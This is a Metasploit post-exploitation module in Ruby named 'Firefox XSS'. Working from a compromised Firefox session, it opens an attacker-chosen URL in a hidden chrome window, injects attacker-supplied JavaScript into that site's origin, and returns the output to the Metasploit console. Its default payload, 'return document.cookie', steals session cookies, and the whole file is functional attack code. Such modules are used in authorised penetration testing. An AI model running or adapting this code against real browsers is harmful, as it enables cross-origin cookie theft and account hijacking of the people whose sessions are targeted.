##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Post
  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Firefox XSS',
      'Description'   => %q{
        This module runs the provided SCRIPT as javascript in the
        origin of the provided URL. It works by navigating a hidden
        ChromeWindow to the URL, then injecting the SCRIPT with Function.

        The value returned by SCRIPT is sent back to the Metasploit instance.
        The callback "send(result)" can also be used to return data for
        asynchronous scripts.

      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'joev' ],
      'Platform'      => [ 'firefox' ]
    ))

    register_options([
      OptString.new('SCRIPT', [true, "The javascript command to run", 'return document.cookie']),
      OptPath.new('SCRIPTFILE', [false, "The javascript file to run"]),
      OptString.new('URL', [
        true, "URL to inject into", 'http://metasploit.com'
      ]),
      OptInt.new('TIMEOUT', [true, "Maximum time (seconds) to wait for a response", 90])
    ], self.class)
  end

  def run
    results = cmd_exec(",JAVASCRIPT,#{js_payload},ENDSCRIPT,", nil, datastore['TIMEOUT'])

    if results.present?
      print_good results
    else
      print_error "No response received"
    end
  end

  def js_payload
    js = datastore['SCRIPT'].strip
    %Q|

      (function(){
        var hiddenWindow = Components.classes["@mozilla.org/appshell/appShellService;1"]
                               .getService(Components.interfaces.nsIAppShellService)
                               .hiddenDOMWindow;

        hiddenWindow.location = 'about:blank';
        var src = (#{JSON.unparse({ :src => js })}).src;
        var XHR = hiddenWindow.XMLHttpRequest;
        var key = "#{Rex::Text.rand_text_alphanumeric(8+rand(12))}";
        hiddenWindow[key] = true;
        hiddenWindow.location = "#{datastore['URL']}";
        
        var evt = function() {
          if (hiddenWindow[key]) {
            schedule(evt);
          } else {
            schedule(function(){
              cb(hiddenWindow.Function(src)());
            }, 500);
          }
        };

        var schedule = function(cb, delay) {
          var timer = Components.classes["@mozilla.org/timer;1"].createInstance(Components.interfaces.nsITimer);
          timer.initWithCallback({notify:cb}, delay\|\|200, Components.interfaces.nsITimer.TYPE_ONE_SHOT);
          return timer;
        };

        schedule(evt);
      })();

    |.strip
  end
end
